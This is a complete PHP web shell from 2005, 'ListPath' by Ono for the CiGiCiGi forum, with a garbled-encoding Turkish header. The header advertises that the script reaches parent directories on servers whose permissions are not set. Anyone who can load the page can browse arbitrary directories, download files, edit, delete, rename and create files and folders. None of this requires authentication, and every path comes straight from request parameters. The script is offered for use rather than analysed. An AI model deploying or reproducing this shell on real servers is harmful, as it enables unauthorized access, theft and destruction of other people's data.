<!-- 
A�IKLAMALAR
Www.CiGiCiGi.Com Www.CiGiCiGi.Net Irc.CiGiCiGi.Com by Ono 

PHP ListPath by Ono for CiGiCiGi.Com
Versiyon: 1.0

Listpath, e�er serverde "Permission" lar ayarlanmam��sa �st dizinlere eri�imi sa�lar.

A��klama:
Bu script Ono taraf�ndan CigiCigi userlar� i�in yaz�lm��t�r.
Script makinadaki izin verilen t�m dizinlere eri�ebilir ve dizinde,
1-Yeni klas�r olu�turabilir,
2-Yeni dosya olu�turabilir,
3-Herhangi bir dizindeki dosyay� GZip ile s�k��t�r�p download edebilir,
4-Dosyalar� editleyebilir,
5-Dosyalar� ve klas�rleri silebilir,
6-Dosyalar� ve klas�rleri yeniden adland�rabilirsiniz.

Uyar�lar:
1-Dizinlerin sonuna / koyulmal�d�r. Dizinleri kullan�rken / kullanmaya dikkat edin. PHP'de \ sorun yaratmaktad�r.
2-Herhangi bir dosyay� download etmek i�in dosyaya t�klamak yeterlidir. Script otomatikmen s�k��t�r�p download'� ba�latacakt�r.
3-Script �al��t��� anda, �al��t��� dizinde "cigiabout.gif" isimli 7 Kb boyutunda bir resim yaratmaktad�r.
4-E�er sistemde permisionlar ayarlanmam��sa �st dizinlere ula�abilirsiniz. Aksi takirde �st dizinler g�r�nt�lenmeyecektir.
5-�st dizine ge�mek i�in .. klas�r�n� kullanabilirsiniz.
6-Herhangi bir hata ile kar��la��rsan�z a�a��daki ileti�im adreslerinden bana ula�abilirsiniz.

Yeni s�r�m ve download i�in CigiCigi.Com ve CigiCigi forumlar�n� takip ediniz.

�2005 CiGiCiGi, Ono

Mail & MSN: ono@cigicigi.com
ICQ: 619769

-->
<?php
$hata = ".";
if ( !$_GET['dir'] || $_GET['dir'] == $hata ) $dir = "./";
else $dir = $_GET['dir'];
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-9">
<title>PHP Listpath by Ono for CiGiCiGi.COM</title>
<style type="text/css">
<!--
body, table, input, pre {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	font-size: 10px;
}
table {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	font-size: 10px;
	background-color: #999999;
	border: inset #FF0000;
}
textarea {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	font-size: 10px;
	height: 60%;
	width: 100%;
}
a:link {
	color: #800000;
	text-decoration: none;
}
a:visited {
	color: #800000;
	text-decoration: none;
}
a:active {
	color: #800000;
	text-decoration: none;
}
a:hover {
	color: #800000;
	text-decoration: underline;
}
-->
</style>
</head>

<body>

<?php

echo "<strong>CiGiCiGi ListPath by Ono</strong>\n<br><br>\n";
$download = $_GET['download'];
$editfile = $_GET['editfile'];
$sil = $_GET['sil'];
$klasorsil = $_GET['klasorsil'];
$yenidenad = $_GET['yenidenad'];
$klasoryenidenad = $_GET['klasoryenidenad'];
$newfile = $_GET['newfile'];
$newdir = $_GET['newdir'];
if ( $download  ) download($download);
if ( $editfile  ) edit($editfile);
if ( $sil ) sil($sil);
if ( $klasorsil ) klasorsil($klasorsil);
if ( $yenidenad ) yenidenad($yenidenad);
if ( $klasoryenidenad ) klasoryenidenad($klasoryenidenad);
if ( $newfile ) newfile($newfile);
if ( $newdir ) newdir($newdir);
echo("<form method=\"get\" action=\"\">
  <input type=\"submit\" value=\" Dizine Git \">
  <input name=\"dir\" type=\"text\" id=\"dir\" size=\"50\" value=\"$dir\"> 
  <a href=\"javascript:history.back(-1)\">Geri</a> - <a href=\"?newfile=1&dir=$dir\">Yeni Dosya Olu�tur</a> - <a href=\"?newdir=1&dir=$dir\">Yeni Klas�r Olu�tur</a> 
</form>\nScriptin �al��t��� dizin: " . getcwd() . "<br>\n�uan listelenen dizin: $dir<br><br>\n<table width=\"800\"  border=\"1\">
  <tr>
    <td>Dosya veya Klas�r ad� </td>
    <td width=\"25\">Edit</td>
    <td width=\"17\">Sil</td>
    <td width=\"100\">Yeniden Adland�r </td>
  </tr>\n");
klasor($dir);
files($dir);
echo("</table><br><br>\n");

//Klas�r Listeleme Fonksiyonu
function klasor($dir) {

if (is_dir($dir)) {
    if ($dh = opendir($dir)) {
        while (($file = readdir($dh)) !== false) {
			if ( filetype("$dir/$file") == dir ) echo("  <tr>
    <td><strong><a href=\"?dir=$dir$file/\" style=\"color:#990000\">$file</a></strong></td>
    <td>&nbsp;</td>
    <td><strong><a href=\"?klasorsil=$dir$file/&dir=$dir\" style=\"color:#990000\">Sil</a></strong></td>
    <td><strong><a href=\"?klasoryenidenad=$dir$file/&dir=$dir\" style=\"color:#990000\">Yeniden Adland�r</a></strong></td>
  </tr>\n");
        }
        closedir($dh);
    }
}

}


//Dosya Listeleme Fonksiyonu
function files($dir) {

if (is_dir($dir)) {
    if ($dh = opendir($dir)) {
        while (($file = readdir($dh)) !== false) {
			if ( filetype("$dir/$file") == file ) {
			echo("  <tr>
    <td><a href=\"?download=$dir$file/&file=$file&dir=$dir\">$file</a> - " . filesize("$dir$file") . " BYTE</td>
    <td><a href=\"?editfile=$dir$file/&dir=$dir\">Edit</a></td>
    <td><a href=\"?sil=$dir$file/&dir=$dir\">Sil</a></td>
    <td><a href=\"?yenidenad=$dir$file/&file=$file&dir=$dir\">Yeniden Adland�r</a></td>
  </tr>\n");
          }
        }
        closedir($dh);
    }
}

}


//GZip & Download Fonksiyonu
function download($download) {
$handle = fopen($download,"r");
$icerik = fread($handle, filesize($download));
$file = $_GET['file'];
$zp = gzopen("$file.gz", "w9");
gzwrite($zp, $icerik);
gzclose($zp);
header("Location: $file.gz");
}


//Dosya Editleme Fonksiyonu
function edit($editfile) {
$edit = $_POST['edit'];
if ( !$edit ) {
$handle = fopen($editfile,"r");
$icerik = fread($handle, filesize($editfile));
echo("<form method=\"post\" action=\"?editfile=$editfile\">
  <input name=\"edit\" type=\"hidden\" id=\"edit\" value=\"1\">
  <textarea name=\"editfileicerik\" rows=\"30\" wrap=\"OFF\">" . htmlspecialchars($icerik) . "</textarea>
  <input type=\"submit\" value=\" Editle\">\n</form>");
}
else {
$handle = fopen($editfile,"w");
fwrite($handle,$_POST['editfileicerik']);
fclose($handle);
echo("<strong>Dosya editlendi</strong><br><br>\n");
}
}


//Dosya Silme Fonksiyonu
function sil($sil) {
unlink($sil);
echo("<strong>Dosya silindi</strong><br><br>\n");
}


//Klas�r Silme Fonksiyonu
function klasorsil($klasorsil) {
if ( rmdir($klasorsil) ) echo("<strong>Klas�r silindi</strong><br><br>\n");
else echo("<strong>Klas�r bo� de�il, silinemedi</strong><br><br>");
}


//Yeniden Adland�rma Fonksiyonu
function yenidenad($yenidenad) {
$file = $_GET['file'];
$yeniad = $_POST['yeniad'];
if ( !$yeniad ) echo("<form method=\"post\" action=\"\">
  <input name=\"yeniad\" type=\"text\" id=\"yeniad\" value=\"$file\">
  <input type=\"submit\" name=\"Submit\" value=\" Yeniden Adland�r \">&nbsp;<input type=\"reset\" value=\" �imdiki Ad� \">
</form><br>\n");
else {
$dir = $_GET['dir'];
rename("$dir$file","$dir$yeniad");
echo("<strong>Dosya yeniden adland�r�ld�</strong><br><br>\n");
}
}


//Klas�r Yeniden Adland�rma FOnksiyonu
function klasoryenidenad($klasoryenidenad) {
$file = $_GET['klasoryenidenad'];
$yeniad = $_POST['yeniad'];
if ( !$yeniad ) echo("<form method=\"post\" action=\"\">
  <input name=\"yeniad\" type=\"text\" id=\"yeniad\" value=\"$file\">
  <input type=\"submit\" name=\"Submit\" value=\" Yeniden Adland�r \">&nbsp;<input type=\"reset\" value=\" �imdiki Ad� \">
</form><br>\n");
else {
$dir = $_GET['dir'];
rename("$dir$file","$dir$yeniad");
echo("<strong>Klas�r yeniden adland�r�ld�</strong><br><br>\n");
}
}


//Yeni Dosya Olu�turma Fonksiyonu
function newfile($newfile) {
$dir = $_GET['dir'];
$filename = $_POST['filename'];
$icerik = $_POST['icerik'];
if ( !$filename || !$icerik ) echo("<form method=\"post\" action=\"\">
  <p>
    Dosya ad�<br>
    <input name=\"filename\" type=\"text\" id=\"filename\">
</p>
  <p>��erik<br>
    <textarea name=\"icerik\" rows=\"30\" id=\"icerik\"></textarea>
    <br>
    <input type=\"submit\" value=\" Yeni Dosya Olu�tur\">
  </p>
</form>");
else {
$handle = fopen("$dir$filename","w");
fwrite($handle,"$icerik");
echo("<strong>Yeni Dosya Olu�turuldu</strong><br><br>\n");
}
}


//Yeni Klas�r Fonksiyonu
function newdir($newdir) {
$dir = $_GET['dir'];
$dirname = $_POST['dirname'];
if ( !$dirname ) echo("<form method=\"post\" action=\"\">
  <input name=\"dirname\" type=\"text\" id=\"dirname\">
  <input type=\"submit\" name=\"Submit\" value=\" Yeni Klas�r Olu�tur \">
</form><br>\n");
else {
mkdir("$dir$dirname");
echo("<strong>Yeni Klas�r Olu�turuldu</strong><br><br>\n");
}
}

?>

</body>
</html>
<!-- Www.CiGiCiGi.Com Www.CiGiCiGi.Net Irc.CiGiCiGi.Com by Ono -->